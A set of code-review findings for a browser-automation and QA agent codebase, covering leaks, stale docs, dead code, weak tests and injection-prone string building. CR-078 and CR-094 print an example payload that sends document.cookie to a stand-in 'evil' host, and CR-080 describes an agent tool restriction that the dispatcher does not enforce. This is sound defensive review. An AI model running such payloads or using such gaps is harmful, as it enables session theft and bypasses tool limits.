Align the behavior — either always print the heading with "No findings." or
always skip empty groups — for all four severities.

### CR-073: AGENTS.md's guarded-surface citation for the imported-skill-count test no longer matches the code

**File:** `packages/core/test/metadata.test.ts`
**Anchor:** `pins the IMPORTED skill set at exactly 32`
**Severity:** low

The repo root `AGENTS.md`'s "Guarded surfaces" section names this test by exact title for cite-by-name purposes: `"the pinned imported-set literal in \"pins the IMPORTED skill set at exactly 31\""`. The actual test in this file (run; it passes) is titled `"pins the IMPORTED skill set at exactly 32"` and asserts `expect(Object.keys(imported).length).toBe(32)`. A skill was added to `imported:` (mattpocock-skills, per the test's own comment) after `AGENTS.md`'s guarded-surfaces list was last updated, and the citation was never bumped. AGENTS.md's whole point for this section is that an agent can grep for the quoted title to find the guarded literal without a line number; that grep now fails. This is a documentation-drift issue only — the test itself is correct and enforced — but it defeats the citation mechanism AGENTS.md relies on. Fix: update AGENTS.md's citation from "31" to "32".

### CR-074: `removeWorktree`'s comment promises to "let the caller know" on real failure but the function cannot

**File:** `packages/crew/src/core/worktree.ts`
**Anchor:** `removeWorktree`
**Severity:** low

The comment on the final branch says: "Real failure — let the caller know, but don't throw (stop must not fail)." The function's signature is `Promise<void>` and the branch only runs `git worktree prune` as a fallback and then falls off the end of the function — there is no return value, thrown error, or logged diagnostic that reaches the caller. A genuine failure (e.g. permission denied removing the worktree directory) is indistinguishable from success to every caller (`stop.ts` calls this and always reports "stopped. Shim removed." regardless). This isn't a functional break — `stop` intentionally never fails on worktree cleanup — but the comment describes behavior the code doesn't have, which will mislead the next reader into thinking failures are surfaced somewhere.

Fix: either make the comment accurate (state plainly that failures are swallowed and unobservable), or actually surface the failure (e.g. attach a warning to the `CommandResult` returned by `cmdStop`).

### CR-075: Verdict-cache grows without bound for the lifetime of the dashboard process

**File:** `packages/flight/dashboard/src/scan.ts`
**Anchor:** `_verdictCache`
**Severity:** low

`_verdictCache` is a module-level `Map<string, DashboardVerdict>` that is
written to but never evicted from or capped:

```ts
const _verdictCache = new Map<string, DashboardVerdict>();
```

Every run directory ever observed under `resultsRoot` — not just the 5 most
recent per cell that stay in the rendered window — gets exactly one entry via
`readDashboardVerdict`, since `scanRunDir` calls it for every listed run dir
(for identity resolution) before `scanResults` windows the buckets down to
the last 5. The dashboard is designed to run indefinitely as a long-lived
server (`startScanner`/`stopScanner`, a 1s tick loop, SSE clients) polling a
`results/` directory that accumulates over the life of a CI/QA fleet. There is
no LRU or size cap, so memory held by this cache grows monotonically with the
total historical run count on disk, for as long as the dashboard process
stays up, with no mechanism to shed entries for runs that have long since
scrolled out of every cell's window.

This is a genuine, if slow-moving, resource leak rather than an immediate
functional bug — worth capping (e.g. bound the map to the run ids currently
present in some cell's window, or an LRU with a generous ceiling) so a
dashboard left running across a large results/ history doesn't grow without
limit.

### CR-076: `docs/credentials.md` duplicates its own "Username and password" section and links to a nonexistent path

**File:** `packages/flight/docs/credentials.md`
**Anchor:** `## Username and password` (appears twice, verbatim, back to back)
**Severity:** low

The "Username and password" section (the profile example with
`alice@acme.test` / `hunter2-test`, the `HOW-TO-LOGIN.md` guidance, and the
"Profile and `HOW-TO-LOGIN.md` files are routine context…" paragraph) is
written out twice in full, immediately one after the other — an apparent
copy/paste artifact from an edit that duplicated instead of replaced the
section. It reads as though the document was edited twice without noticing
the first copy was still present.

Separately, the "See also" section links to
`[src/adapters/web/cookies.ts](../src/adapters/web/cookies.ts)` and
`[src/adapters/web/passkey.ts](../src/adapters/web/passkey.ts)`. Relative to
this file's location (`packages/flight/docs/credentials.md`), those resolve
to `packages/flight/src/adapters/web/{cookies,passkey}.ts`, which do not
exist — confirmed via `find packages/flight/src -iname cookies.ts -o -iname
passkey.ts`, which resolves them to `packages/flight/src/qa/adapters/web/
{cookies,passkey}.ts` (missing the `qa/` segment in the doc link). Per
`AGENTS.md`, `docs/credentials.md` is unguarded prose — no test in
`packages/flight/test` references this file by path, so nothing catches
either defect.

Fix: delete the duplicated section, and correct both links to
`../src/qa/adapters/web/cookies.ts` and `../src/qa/adapters/web/passkey.ts`.

### CR-077: `downscaleImageIfNeeded` builds shell commands via unescaped string interpolation

**File:** `packages/flight/src/qa/adapters/web/lib/screenshot.js`
**Anchor:** `execSync(\`sips -g pixelWidth -g pixelHeight "${filepath}" 2>/dev/null\`, { encoding: 'utf8' })`
**Severity:** low

`downscaleImageIfNeeded(filepath, ...)` builds four separate shell command strings (`sips -g ...`, `sips -Z ...`, `identify -format ...`, `convert ...`) by interpolating `filepath` (and `maxDimension`) directly into a template string passed to `execSync`, wrapped only in double quotes rather than passed as `execFileSync`/`spawnSync` argv entries. A `filepath` containing a double quote, backtick, or `$(...)` would break out of the intended argument and run as shell syntax.

I traced both production call sites of `screenshot()` to confirm this is not currently reachable: `executeScreenshot` (`tools/visual.ts`) and `buildReturnScreenshot` (`tools/return-screenshot.ts`) both build `filename` as `join(tmpdir(), \`moe-flight-screenshot-${Date.now()}.png\`)`, and `capturePageArtifacts`'s screenshot path (`capture.js`) is `path.join(dir, \`${prefix}.png\`)` where `prefix` comes from `createCapturePrefix(actionType)` and every caller passes a hardcoded literal `actionType` (`'click'`, `'type'`, `'select'`, `'eval'`, `'navigate'`). None of these paths currently include LLM- or page-controlled text, so there is no live injection today.

The pattern is still fragile: it is one call-site change away (e.g. a future selector- or URL-derived filename) from being exploitable, and the fix is cheap — use `execFileSync('sips', ['-g', 'pixelWidth', ..., filepath])` / `execFileSync('identify', [...])` instead of building shell strings.

### CR-078: `selectOption`'s `index` parameter is interpolated unescaped into the evaluated JS source

**File:** `packages/flight/src/qa/adapters/web/lib/select-option.js`
**Anchor:** `const el = elements[${index}];`

**Severity:** low

`selectOption(tabIndexOrPageSession, selector, value, index = 0)` builds a `Runtime.evaluate` expression with `elements[${index}]` and `'Element not found at index ${index}'` — both raw template interpolation, unlike every sibling value in the same function (`selector`, `value`) which goes through `JSON.stringify`. If `index` is ever a non-numeric string reaching this call (e.g. `"0]; fetch('https://evil/'+document.cookie); //"`), it breaks out of the array-index expression into arbitrary JS running in the page context.

I checked reachability: no tool in `tool-defs.ts`/`tools/*.ts` currently exposes `select_option`, so `selectOption` (and `capture.js`'s `selectOptionWithCapture`) is not wired to any LLM-facing tool today, and there is no test file for `select-option.js` under `packages/flight/test/`. So this is not exploitable through the current production surface, but it is exported on every `createSession()` object returned by `chrome-ws-lib.js`, and the very next caller to wire it to a tool (matching the sibling `click`/`hover`/etc. tools, all of which pass LLM-controlled arguments straight through) would reintroduce exactly the kind of injection the rest of this file's siblings already guard against with `JSON.stringify`.

Fix: interpolate `JSON.stringify(index)` (and validate it's an integer) the same way `value` already is.

### CR-079: `readPasskeyFile` accepts a non-integer `signCount` despite its own error message requiring one

**File:** `packages/flight/src/qa/adapters/web/passkey.ts`
**Anchor:** `"missing or invalid signCount (must be an integer)"`
**Severity:** low

`readPasskeyFile`'s validation is `if (typeof p.signCount !== "number") throw ... "missing or invalid signCount (must be an integer)"`. The check only verifies `signCount` is a `number`, not that it is an integer (`Number.isInteger`) or non-negative. A credential YAML with `signCount: 1.5` (a plausible authoring typo) passes this check silently, then gets forwarded verbatim to `session.addCredential` / CDP's `WebAuthn.addCredential`, which is documented elsewhere in this file to be picky about field encodings — the agent will get a confusing late CDP-level rejection instead of the clear, immediate validation error the message promises. Fix: `Number.isInteger(p.signCount) && p.signCount >= 0`.

### CR-080: `eval` tool remains dispatchable after being deliberately removed from the schema

**File:** `packages/flight/src/qa/adapters/web/tool-defs.ts`
**Anchor:** `"eval" is intentionally omitted (PRI-1590 experiment)`; corroborated by `executeEval` in `tools/page-actions.ts`
**Severity:** low

`tool-defs.ts` documents that `eval` was deliberately dropped from `webToolDefinitions()` "to remove its pull on the agent toward developer-pattern escapes," and `tools/page-actions.ts` (also in this shard) still fully implements `executeEval`. I followed the dispatch site in `packages/flight/src/qa/adapters/web/adapter.ts` (outside this shard, read only to confirm the call graph) and found `executeTool`'s `switch (name)` has an unconditional `case "eval": return executeEval(ctx, args);` with no check against the tool list actually advertised for the run — the schema-driven `validateToolArgs` gate only runs `if (schema)`, i.e. only for tools present in `toolDefinitions()`, and skips straight past for a tool the schema omits, rather than rejecting an undeclared tool name outright.

In practice this is currently gated by whichever LLM provider's tool-calling API is in use only agreeing to emit tool-call blocks for names in the declared `tools` list — I did not verify that constraint for every `LLMClient` implementation in this codebase (`anthropic.ts`/`openai.ts` are outside this shard) or for revived/replayed transcripts. If any code path ever hands `executeTool` a call named `"eval"` — a lenient or custom provider, a revived session containing an older transcript's tool call, a test harness — the "removal" does nothing to stop it, because the only enforcement is that the model wasn't offered the tool, not that the adapter refuses to run it. Fix: have `executeTool` reject any tool name not present in the current `toolDefinitions()` set, independent of the schema-shape check, so removing a tool from the schema is actually removing it.

### CR-081: `/:runId/snapshot` serializes the internal `RunSnapshot` struct wholesale, contradicting its own "never serialized" contract

**File:** `packages/flight/src/qa/api/routes/active-runs.ts`
**Anchor:** `router.get("/:runId/snapshot", ...)`, `return c.json(snap)`
**Severity:** low

`RunSnapshot.abortController` in `active-runs.ts` (the data model, also in this shard) is documented as "NOT part of the public `ActiveRunInfo` payload — internal infrastructure, never serialized to clients." The `/:runId/snapshot` route in `routes/active-runs.ts`, however, does `return c.json(snap)` on the entire `RunSnapshot` object — `info`, `lastFrame`, `progressLog`, and `abortController` together — rather than picking out the public fields. Today this is harmless because `AbortController` has no own enumerable properties and serializes to `{}`, but the route's actual behavior does not match the guarantee documented on the type it serializes: any future field added to `RunSnapshot` that is meant to stay internal (the kind of thing the `abortController` comment anticipates) will be silently exposed over this unauthenticated HTTP endpoint the next time someone adds it, because nothing at the route enforces the boundary the comment promises. Fix: build an explicit public snapshot shape (`{ info, lastFrame, progressLog }`) at the route instead of forwarding the internal struct.

### CR-082: `run-sets.ts` manifest reads skip the malformed-JSON handling every sibling route has

**File:** `packages/flight/src/qa/api/routes/run-sets.ts`
**Anchor:** `router.get("/:id", ...)`
**Severity:** low

`GET /api/run-sets/:id`, `GET /api/run-sets/:id/summary`, and `DELETE
/api/run-sets/:id` (the latter only reads via `cancelTokens`, not affected)
all do `JSON.parse(readFileSync(path, "utf8"))` with no try/catch. Every
comparable read in this shard — `results.ts`'s `/:runId` and `/:runId/file`
routes, `run-sets.ts`'s own sibling code is the outlier — explicitly catches
a parse failure and returns a structured `{error: "malformed result file"}`
(or similar) with `500`. Here, a corrupted `set.json` (e.g. truncated by a
crash mid-write, which this same codebase's shutdown-drain machinery
explicitly anticipates for `result.json`) instead throws and is caught only
by the app-wide generic handler, returning `{"error":"internal","message":
"Unexpected end of JSON input"}`. Not a crash (Hono's `app.onError` in
`server.ts` catches it), but it is an inconsistent API contract: callers
that specifically branch on the `"malformed result file"`-style shape used
elsewhere in this API won't recognize this response.

Fix: wrap the `JSON.parse` in these two handlers the same way
`resultRoutes` does, for a consistent error envelope.

### CR-083: `ask`'s recorded-model/date lookups can crash with a raw JSON-parse error on a corrupt `run.jsonl`

**File:** `packages/flight/src/qa/cli/ask.ts`
**Anchor:** `peekRecordedModel`
**Severity:** low

`peekRecordedModel` and `peekRecordedDate` each read `run.jsonl` and call
`JSON.parse(line)` on every non-blank line with no try/catch, and
`peekRecordedModel(runDir)` is invoked at the top of `ask()` before any of
the surrounding try/catch blocks (which do exist for `createClient` and
`rebuildMessages`, each producing a specific, actionable message). A
`run.jsonl` with a truncated or corrupted line before any `run_start` event
— plausible given this exact codebase's own shutdown-drain design
explicitly acknowledges runs can be interrupted mid-write — makes
`JSON.parse` throw synchronously and escape `ask()` uncaught. It will still
be caught by the CLI's top-level handler (`formatCliError`), so the process
won't crash raw, but the user sees a generic `SyntaxError` message
("Unexpected end of JSON input" or similar) rather than the specific,
helpful diagnostics (`Cannot revive run: ...`) the surrounding code goes out
of its way to provide for every other failure mode in this same function.

Fix: wrap the line-parsing loop in `peekRecordedModel`/`peekRecordedDate` in
a try/catch that skips (or reports) an unparsable line, consistent with how
`ws-handlers.ts`'s `handleWsOpen` already treats the same `run.jsonl`
per-line parse (`try { JSON.parse(l) } catch { return null }`).

### CR-084: `RunSetWriter.finalize`'s `processedIds` set is computed but never consulted

**File:** `packages/flight/src/qa/evidence/run-set-writer.ts`
**Anchor:** `processedIds` in `finalize`
**Severity:** low

```ts
finalize(lookup: (runId: string) => VerdictResult | null): void {
  // Track which run IDs had results provided via lookup (vs explicitly errored/cancelled)
  const processedIds = new Set<string>();
  for (const run of this.manifest.runs) {
    if (
      run.status !== "queued" &&
      run.status !== "running" &&
      run.status !== "cancelled" &&
      run.status !== "errored"
    ) {
      processedIds.add(run.runId);
    }
  }
  const perCard: CardSummary[] = this.ctx.cards.map((cardId) => { ... });
  ...
```

`processedIds` is populated but `grep -n "processedIds"` shows it is never read anywhere else in the file (or referenced again after the loop that builds it). The comment above it ("Track which run IDs had results provided via lookup...") describes intent that the rest of `finalize` does not implement — `summarizeCard` re-derives its own classification from `run.status` and its own `lookup()` calls without consulting this set. This has no behavioral effect today (dead code, not wrong code), but it reads as load-bearing to a maintainer and should either be wired into the classification logic it was clearly meant to support, or removed.

### CR-085: Stale `stateDirName` field passed to `executeHttpRun` has no effect

**File:** `packages/flight/test/qa/api/run.test.ts`
**Anchor:** `executeRun unregisters before broadcasting terminal event (keyed by runId)` and `runExecuteWithStubbedWebAdapter`
**Severity:** low

Both of these tests call `executeHttpRun({ ..., projectRoot, stateDirName: ".moe-flight", ... })`. `ExecuteHttpRunOpts` (in `packages/flight/src/qa/api/routes/run.ts`) has no `stateDirName` field — the function only ever reads `effective.stateDirName` (the resolved run config, already threaded through `mergeRunConfig`) when it needs the state-dir leaf name, e.g. in the `beforeAgent` hook that computes `framesDir`. The literal `stateDirName: ".moe-flight"` the tests pass is therefore inert; if it were ever forced to a different value the test would still resolve paths against whatever `effective.stateDirName` carries.

This is silent today because `packages/flight/tsconfig.tests.json` intentionally excludes `test/qa/**` from typechecking (its own comment records this as a known, tracked gap: "593 errors... a real gap, recorded as a follow-up"), so the excess property never trips `tsc`'s object-literal check, and at runtime JS simply ignores the extra key. Confirmed by running `npx tsc -p tsconfig.tests.json --pretty` from `packages/flight` — no error is raised for this file because it isn't in the compiled set at all.

Functionally the tests still pass and still exercise real behavior (the screencast-gate assertions correctly depend on `effective.stateDirName`, which is independently set via `loadConfig({ projectRoot }, ...)` and defaults to `.moe-flight`), so this is not a false-positive test. It is leftover cruft — most likely from a prior version of `ExecuteHttpRunOpts` that took `stateDirName` directly — that no longer means anything and should be deleted so a future reader doesn't assume overriding it changes where frames/results are written.

### CR-086: Temp directory leaked by render-cmd.test.ts (no cleanup)
**File:** `packages/flight/test/qa/cli/render-cmd.test.ts`
**Anchor:** `function makeRun()`
**Severity:** low

`makeRun()` calls `mkdtempSync(join(tmpdir(), "moe-flight-render-cmd-"))` and is invoked from all three tests in the file, but the file never calls `rmSync` on the returned `projectRoot` (no import of `rmSync`, no `afterEach`/`afterAll`). As with `run-one.test.ts` in this same shard, this leaks a temp directory per test run; confirmed 147 stale `moe-flight-render-cmd-*` directories present in the OS temp dir from previous runs. Fix: capture the returned `projectRoot` in each test and remove it in a `finally`/`afterEach`, consistent with `render.ts`'s other consumers in this package (e.g. `render-args.test.ts`'s siblings, `attach.test.ts`) that do clean up.

### CR-087: Temp directories leaked by run-one.test.ts (no cleanup)
**File:** `packages/flight/test/qa/cli/run-one.test.ts`
**Anchor:** `mkdtempSync(join(tmpdir(), "moe-flight-runone-ctx-"))`
**Severity:** low

This file calls `mkdtempSync` four times (`moe-flight-runone-ctx-`, `moe-flight-runone-noctx-`, `moe-flight-runone-`) across its three tests but never imports or calls `rmSync`, and there is no `afterEach`/`afterAll` cleanup hook. Every sibling test file in this same shard that creates a temp project root (`ask.test.ts` via `afterEach`, `batch.test.ts` and `run.test.ts` via `afterAll`, `attach.test.ts` via `afterEach`, `config.test.ts`/`credential-tool.test.ts`/`read-tool.test.ts` via `try/finally`) cleans up its temp directory; this one does not, so it is an inconsistency with the established pattern rather than a deliberate choice.

I verified this is not merely theoretical: `ls -d "$TMPDIR"/moe-flight-runone-*` on this machine currently shows 147 leftover directories accumulated from prior test runs (same command against `moe-flight-render-cmd-*` also shows 147, corroborating the pattern below). Each run of the suite adds three more directories under the OS temp dir that are never reclaimed until the OS clears `/tmp` (or, on CI runners with a long-lived temp volume, not at all). Fix: add an `afterEach`/`afterAll` that `rmSync(dir, { recursive: true, force: true })`s each created root, matching the pattern used elsewhere in this same test suite.

### CR-088: `cli-batch.test.ts` reproduces the exact `AppConfig` field-name drift `make-config.ts` was written to prevent

**File:** `packages/flight/test/qa/integration/cli-batch.test.ts`
**Anchor:** `saveScreencast: false`

**Severity:** low

`packages/flight/test/qa/helpers/make-config.ts`'s docstring explains it was extracted because four near-identical inline `AppConfig` literals had drifted — "one used `saveScreencast` instead of the actual field name `defaultSaveScreencast`" (PRI-1640) — and that typing the return value as the real `AppConfig` "surfaces field-name drift at compile time instead of hiding it behind a cast." `cli-batch.test.ts`'s inline config does exactly that again: `saveScreencast: false` (the real field is `defaultSaveScreencast`; confirmed against `src/qa/config.ts`), plus a nonexistent `defaultMaxStuckRetries` field (removed in v4 per `src/qa/types.ts`'s own comment) and a `sources` object missing most of the real required keys — all made possible only because the whole literal is cast `as any`, which defeats the exact compile-time check `make-config.ts` exists to provide. The test currently passes (verified: `vitest run test/qa/integration/cli-batch.test.ts`) because `runBatch`'s CLI-adapter path never reads the fields that are missing or misnamed (`host`, `apiKeys`, `wsOriginAllowlist`, `defaultSaveScreencast`, …), but that's incidental to the current implementation, not guaranteed by the test. Any future code path that reads `config.apiKeys.anthropic` or `config.defaultSaveScreencast` on this call would either read `undefined` silently or throw `Cannot read properties of undefined`, and the `as any` cast means no compiler warning would ever surface it.

Fix: use `makeConfig(projectRoot, { ... })` from `test/qa/helpers/make-config.js` here instead of the hand-rolled `as any` literal, the same fix already applied to the four siblings `make-config.ts` names.

### CR-089: `resolveRunDir` has no traversal-safety test despite paths.ts's "one and only path-safety guard" framing
**File:** `packages/flight/test/qa/paths.test.ts`
**Anchor:** `describe("resolveRunDir", ...)`
**Severity:** low

`packages/flight/src/qa/paths.ts` opens with the comment "The one and only path-safety guard for Flight. All containment checks go through this," and the test file backs that claim thoroughly for `isSafePath` and `resolveInside` — including symlink-escape tests and the classic prefix-collision case (`isSafePath("/a/b", "/a/bb")`). `resolveRunDir`, exported from the same module and taking a `runId` the same way `resolveInside` takes a `rel`, is composed with a bare `join()` via `flightPath()` and never calls `isSafePath`/`resolveInside` internally — a `runId` of `"../../etc"` would resolve straight outside the results root with no rejection.

Today's only call site (`packages/flight/src/qa/cli/render.ts`, checked to confirm) passes a CLI argv value, and the HTTP route layer (`api/routes/results.ts`) does its own `join()` + `isSafePath()` check rather than going through `resolveRunDir`, so this isn't currently reachable from an untrusted input. But the test file's own docstring block ("Containment checks operate on already-absolute-or-resolvable inputs... These cover the cases the old `src/api/safe-path.ts` helper handled") signals the whole file's job is exhaustively pinning this module's safety contract, and `resolveRunDir` is the one exported, runId-shaped composer left with zero coverage of the traversal case its siblings are drilled on. Add a test asserting `resolveRunDir` either validates its `runId` or is documented as intentionally unvalidated (call-site-trusted only), so a future caller reaching for "the" path-safety helper in `paths.ts` doesn't reasonably assume it's covered.

### CR-090: Error Log list items can collide on React key under a same-millisecond error burst
**File:** `packages/flight/ui/src/components/AppShell.tsx`
**Anchor:** `key={`${err.timestamp}-${err.source}`}`

**Severity:** low

`ErrorLog.add()` (`packages/flight/src/qa/util/error-log.ts`, read to confirm the shape) stamps each entry with `new Date().toISOString()` (millisecond resolution) and a `source` drawn from only three possible values: `"run" | "fanout" | "cards"`. Two errors from the same source recorded within the same millisecond — plausible during a run-set with several near-simultaneous failures, all logged via `source: "run"` — produce an identical `${timestamp}-${source}` key. `AppShell`'s error-log `<li>` list keys on exactly that combination, so React sees two siblings with the same key on the polled re-render (the panel refetches every 10s via `setInterval(refreshErrors, 10000)`), which is exactly the scenario a burst of failures would hit, in the one panel whose entire job is to surface those failures reliably. Use `err.timestamp + err.source + index` (or have the server assign a monotonic id) instead of relying on the tuple being unique.

### CR-091: `Passes` input silently truncates exponent-notation values via `Number.parseInt`

**File:** `packages/flight/ui/src/components/NewRunModal.tsx`
**Anchor:** `handleStart`, `const parsed = Number.parseInt(passes, 10);`

**Severity:** low

`passes` is bound to `<input type="number" min={1} max={50} .../>`. HTML
number inputs accept exponential notation as valid content (e.g. `1e2` is a
syntactically valid floating-point number per the HTML spec and is accepted
by the input without the browser rejecting or reformatting it as you type).
`Number.parseInt("1e2", 10)` stops parsing at the first non-digit and
returns `1`, not `100` — I confirmed this with `node -e
"console.log(Number.parseInt('1e2', 10))"` → `1`. So a user who types `1e2`
meaning "100 passes" silently gets 1 pass with no error, since `1` passes
the `>= 1 && <= 50` check. Low impact (needs a specific, unusual input) but
silent and surprising given the field looks like it accepts arbitrary
integers.

Fix: use `Number(passes)` (or reject non-plain-digit strings with a regex)
instead of `Number.parseInt`, so exponent/partial-numeric strings are
rejected rather than truncated.

### CR-092: `restoreFocus` builds an invalid CSS selector for `name` attributes containing a quote

**File:** `packages/glass/skills/browsing/lib/capture.js`
**Anchor:** `restoreFocus`, `focusInfo.type === 'name'` branch
**Severity:** low

`restoreFocus` reconstructs a CSS attribute selector via string concatenation
before JSON-stringifying it into a JS string literal:
`document.querySelector(${JSON.stringify(focusInfo.tag + '[name="' + focusInfo.value + '"]')})`.
`JSON.stringify` correctly escapes the result for embedding as a *JavaScript*
string literal, but does nothing for the *CSS* syntax inside that string. An
element whose `name` attribute value legally contains a `"` character (a
perfectly valid HTML attribute value) produces a malformed attribute selector:

```
node -e '
const focusInfo = { type: "name", value: "foo\"bar", tag: "input" };
console.log("document.querySelector(" + JSON.stringify(focusInfo.tag + "[name=\"" + focusInfo.value + "\"]") + ")");
'
// -> document.querySelector("input[name=\"foo\"bar\"]")
```
Evaluating that in a page throws `DOMException: ... is not a valid selector`,
which `throwIfExceptionDetails(restoreResult)` turns into a thrown error,
failing the entire `captureActionWithDiff` call (and therefore
`clickWithCapture`/`fillWithCapture`/etc, which are what the MCP server
actually exposes) whenever the focused element's `name` happens to contain a
quote. Fix: escape embedded `"` in `focusInfo.value` (e.g. `.replace(/"/g, '\\"')`)
before building the attribute-selector string, or use
`CSS.escape`-style handling / `querySelector` with an attribute value built
via `element.getAttribute` comparison instead of string interpolation.

### CR-093: Two independently-maintained dialog-gate allowlists; one implementation is dead code

**File:** `packages/glass/skills/browsing/lib/dialogs.js`
**Anchor:** `withDialogAwareness`, `PAGE_TARGET_ACTIONS`
**Severity:** low

`dialogs.js` exports `PAGE_TARGET_ACTIONS` / `BROWSER_TARGET_ACTIONS` and two dialog-gating helpers built on them: `withDialogAwareness` (keyed by wsUrl) and `withDialogAwarenessForSession` (keyed by sessionId). Grepping the whole `packages/glass/skills/browsing` tree shows `withDialogAwareness` (the wsUrl-keyed one) is never called anywhere — only defined and exported. The session-keyed variant is called from exactly four sites in `lib/capture.js`, hardcoding the action names `'click'`, `'type'`, `'select'`, `'eval'`.

Meanwhile the actual, comprehensive dialog gate that protects every other page-target method (`back`, `forward`, `hover`, `drag`, `mouseMove`, `scroll`, `doubleClick`, `rightClick`, `humanType`, `fileUpload`, `keyboardPress`, `setViewport`, ...) lives in `chrome-ws-lib.js` as a *separately maintained* set, `PAGE_TARGET_SESSION_METHODS`, consumed by `wrapWithDialogGate`. So there are two parallel, independently-updated allowlists for "does this need the dialog gate," one of which (dialogs.js's `PAGE_TARGET_ACTIONS`/`withDialogAwareness`) is almost entirely unexercised: 17 of its 21 entries (`navigate`, `extract`, `screenshot`, `attr`, `await_element`, `await_text`, `hover`, `drag_drop`, `mouse_move`, `scroll`, `double_click`, `right_click`, `file_upload`, `keyboard_press`, `set_viewport`, `clear_viewport`, `get_viewport`) are never actually consulted by any live code path, and the wsUrl-keyed function built on the set is never called at all.

This is a maintenance/drift hazard rather than a live bug today: a future contributor adding a new page-target action would reasonably update `PAGE_TARGET_ACTIONS` (the more prominently documented set, with a full doc comment) believing that's sufficient to gate it, while the actual enforcement point they need to touch is `chrome-ws-lib.js`'s `PAGE_TARGET_SESSION_METHODS`. Any bug introduced in the dead `withDialogAwareness` function would also never be caught by any test that exercises real behavior. Recommend either wiring `withDialogAwareness` into an actual call site or deleting it and the unused portions of `PAGE_TARGET_ACTIONS`/`BROWSER_TARGET_ACTIONS`, and consolidating on the one set that chrome-ws-lib.js actually enforces.

### CR-094: `selectOption`'s `index` parameter is interpolated into generated JS source unescaped

**File:** `packages/glass/skills/browsing/lib/select-option.js`
**Anchor:** `elements[${index}]`
**Severity:** low

`selectOption(tabIndexOrWsUrl, selector, value, index = 0)` builds a `Runtime.evaluate` expression string. `selector` and `values` are embedded via `JSON.stringify` (safe), but `index` is spliced in directly: `` `const el = elements[${index}]; ... 'Element not found at index ${index}'` ``. There is no `Number.isInteger(index)` check and no `JSON.stringify(index)` wrapping, unlike every other value this module (and the rest of the `lib/` tree) embeds into generated page-side JS.

I confirmed both current call sites — `capture.js`'s `selectOptionWithCapture` and the `chrome-ws` CLI's `select` command — always pass the literal default (`index` is never threaded through from any caller-controlled value today), so this is not presently reachable with untrusted input. But `attachSelectOption({ getPageSession })` is a publicly exported module whose documented signature accepts an `index`, and the multi-element-warning feature it exists for (JRV-129) is exactly the kind of feature a future caller would wire a user-supplied index into. If that ever happens without an intermediate validation layer, a value like `0]; fetch('https://evil/'+document.cookie); ({x:[0` would execute arbitrary JS in the page's `Runtime.evaluate` context. Recommend validating `Number.isInteger(index)` up front and embedding via `JSON.stringify(index)` for consistency and defense-in-depth, the same way `selector`/`values` already are.

### CR-095: `type` action has no way to avoid the ~80-160ms-per-character `humanType` path

**File:** `packages/glass/src/index.ts`
**Anchor:** `BrowserAction.TYPE`
**Severity:** low

The `type` action's handler unconditionally calls `chromeLib.humanType(tabIndex, selector, text)` with no `options`. `humanType`'s own JSDoc (`lib/keyboard-input.js`) documents a per-character wait of `delay + jitter` with defaults `delay=80, jitter=80` — i.e. 80-160ms per character (average ~120ms), by design, for bot-detection resistance. There is no field in the `type` action's payload shape (`PAYLOAD_SPECS.type = { kind: 'scalar', defaultKey: 'text' }`, and the handler only reads `p.text`/`p.selector`) through which a caller can pass `delay`/`jitter` (or opt into the faster, already-implemented `fill()` used by the CLI and `capture.js`'s `fillWithCapture`).

Concretely: typing a 500-character value (a moderately long form field, a JSON blob, a paragraph of text — all ordinary uses of a browser-automation "type" action) takes on the order of 60 seconds with the documented defaults, with no override reachable through the MCP tool's schema or the HELP text (which just says `payload=literal text to type`). Any MCP host with a tool-call timeout shorter than that turns an entirely ordinary "type this text" request into a silent failure, and the codebase already contains the faster primitive (`fill`) that solves exactly this but is never wired into the exposed `type` action. Recommend forwarding `p.delay`/`p.jitter` (or a `p.fast` flag routing to `fill`) from the `type` payload into the underlying call.

### CR-096: Temp directories from capture.test.mjs regression cases are never cleaned up

**File:** `packages/glass/test/lib/capture.test.mjs`
**Anchor:** `fs.mkdtempSync(path.join(os.tmpdir(), 'bug3-'))`
**Severity:** low

The outer `describe('capture')` block creates `tmpRoot` via `mkdtempSync` and
removes it in `afterAll`. Two sibling `describe` blocks — "captureActionWithDiff
session pinning (Bug 3 regression)" and "captureActionWithDiff restoreFocus
uses preventScroll (Bug 4 regression)" — each call `fs.mkdtempSync(...)`
directly (`bug3Dir`, `bug4Dir`) with no corresponding `afterAll`/`finally`
cleanup anywhere in the file. Every test run leaves two fresh directories under
the OS temp dir permanently. Low impact (empty-ish dirs, not sensitive data),
but it is an unbounded leak across CI runs and repeated local `pnpm test`
invocations. Fix: reuse the same `afterAll`-tracked cleanup pattern the outer
block already has, or move `bug3Dir`/`bug4Dir` under the shared `tmpRoot`.

### CR-097: `runSync` re-registers process-level signal/exit handlers on every call with no cleanup
**File:** `packages/memory/src/sync-cli.ts`
**Anchor:** `process.on("exit", releaseSyncLockOnce);`
**Severity:** low

`runSync()` unconditionally adds one listener each for `"exit"`, `"SIGINT"`, `"SIGTERM"`, and `"SIGHUP"` every time it runs, and never removes them (`process.off`/`removeListener` is never called). For a normal one-shot CLI invocation this is harmless because the process exits immediately afterward. But `runSync` is an exported function, not a script entry point, and nothing prevents it from being called more than once inside a single process (e.g. a test suite that calls it repeatedly, or any future in-process caller). Each extra call adds four more permanent listeners; past the default Node limit of 10 per event, `process.on("exit", ...)` and friends will start emitting `MaxListenersExceededWarning`, and every one of the accumulated closures (each capturing its own `syncLock`/`released` state) fires on the eventual signal/exit even though only the most recent call's lock is still meaningfully live. It's inert in the common CLI case, but it's a real, unbounded listener leak for any repeated in-process use — guard with `once()` plus explicit removal after `releaseSyncLockOnce()` fires, or register the handlers once at module scope instead of per-call.

### CR-098: Vacuous "malformed JSONL" test does not exercise malformed input

**File:** `packages/memory/test/parser.test.ts`
**Anchor:** `it("should handle malformed JSONL gracefully", ...)`
**Severity:** low

The test's own comment admits it: "This test would need a fixture with malformed JSON. For now, we verify that valid fixtures don't throw." The body calls `parseConversationFile` on `short-conversation.jsonl` — a valid fixture already covered by three other tests in the same `describe` block — and asserts only `expect(result).toBeDefined()`. It never constructs or feeds malformed JSONL, so it cannot catch a real regression in the parser's malformed-line handling (e.g., a change that makes `parseConversationFile` throw on a truncated or non-JSON line instead of skipping it). I confirmed by grep that no other file in `packages/memory/test/` exercises malformed JSONL input (`verify.test.ts` even has a comment noting corruption detection is "harder to test... skipping for now"), so this is the only place such a regression could be caught, and it is not caught. A reader trusting the test name would believe malformed-input handling is under regression protection; it is not. Fix: either write a fixture with a genuinely malformed line (unterminated JSON, non-JSON garbage line mixed with valid lines) and assert the valid lines still parse, or rename the test to reflect what it actually verifies and drop the misleading claim.

